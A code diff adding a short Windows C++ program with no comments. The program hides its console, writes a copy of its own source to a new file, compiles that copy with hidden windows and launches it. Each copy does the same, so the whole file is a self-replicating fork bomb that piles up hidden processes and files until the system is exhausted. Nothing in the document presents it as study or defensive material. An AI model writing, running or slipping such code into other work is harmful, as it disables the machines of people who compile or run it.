@@ -1,0 +1,25 @@
+#include <bits/stdc++.h>
+#include <windows.h>
+using namespace std;
+void r(const string& c,bool w){
+    STARTUPINFO si={sizeof(si)};
+    PROCESS_INFORMATION pi;
+    si.dwFlags=STARTF_USESHOWWINDOW;
+    si.wShowWindow=SW_HIDE;
+    char* p=new char[c.size()+1];
+    strcpy(p,c.c_str());
+    if(CreateProcess(NULL,p,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
+        if(w) WaitForSingleObject(pi.hProcess,INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    delete[] p;
+}
+int main(){
+    ShowWindow(GetConsoleWindow(),SW_HIDE);
+    string f="copy_"+to_string(chrono::high_resolution_clock::now().time_since_epoch().count())+".cpp";
+    { ifstream s(__FILE__); string c((istreambuf_iterator<char>(s)),istreambuf_iterator<char>()); ofstream o(f); o<<c; }
+    string e=f.substr(0,f.find_last_of('.'));
+    r("g++ "+f+" -o "+e+".exe -std=c++11 -mwindows",1);
+    r(e+".exe",0);
+}
